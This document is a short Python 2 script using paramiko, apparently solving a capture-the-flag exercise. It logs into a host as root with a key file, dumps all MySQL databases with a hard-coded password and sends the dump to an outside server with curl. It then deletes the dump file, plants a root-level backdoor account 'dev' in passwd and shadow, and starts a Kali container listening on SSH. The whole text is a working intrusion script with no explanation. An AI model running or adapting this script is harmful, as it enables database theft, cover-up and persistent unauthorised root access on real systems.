import paramiko

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('10.83.20.77', username='root', key_filename='/root/Downloads/uploads/id_rsa')

stdin, stdout, stderr = client.exec_command('id')
print stdout.read()
stdin, stdout, stderr = client.exec_command('ls -l')
print stdout.read()
stdin, stdout, stderr = client.exec_command('docker ps')
print stdout.read()
#stdin, stdout, stderr = client.exec_command('docker exec -it victim_db_1 /bin/sh')
#print stdout.read()
stdin, stdout, stderr = client.exec_command('docker exec ubuntu_db_1 bash -c "mysqldump -u root -p351BrE7aTQE8 --all-databases > /data-dump.sql"')
print stdout.read(), stderr.read()
stdin, stdout, stderr = client.exec_command('ls -l')
print stdout.read()

#stdin, stdout, stderr = client.exec_command('exit')
#print stdout.read()
stdin, stdout, stderr = client.exec_command('docker cp ubuntu_db_1:/data-dump.sql ./')
print stdout.read()
print stderr.read()
stdin, stdout, stderr = client.exec_command('ls -l')
print stdout.read()

stdin, stdout, stderr = client.exec_command("curl -k -F 'data=@./data-dump.sql' https://10.91.9.93/")
print stdout.read()
print stderr.read()


stdin, stdout, stderr = client.exec_command("rm ./data-dump.sql")
print stdout.read()
print stderr.read()

stdin, stdout, stderr = client.exec_command('docker exec ubuntu_web_1 bash -c "echo dev:x:0:0:root:/root:/bin/bash >> /tmp/etc/passwd"')
print stdout.read(), stderr.read()

stdin, stdout, stderr = client.exec_command("""docker exec ubuntu_web_1 bash -c "echo 'dev:\$6\$oxZGFH3Z\$AQysiuQwc7O1X3.v6NUmBjlruCI/4nsFvnP5Jy2NoBgr44uZIUc3BwuSPomrZNCrySSbs/F4YcOdsqX3ZXjgV.:17701:0:99999:7:::' >> /tmp/etc/shadow" """)
print stdout.read(), stderr.read()


stdin, stdout, stderr = client.exec_command('docker run -p 2222:22 -d tamuctf/kaliimage')
print stdout.read()
print stderr.read()
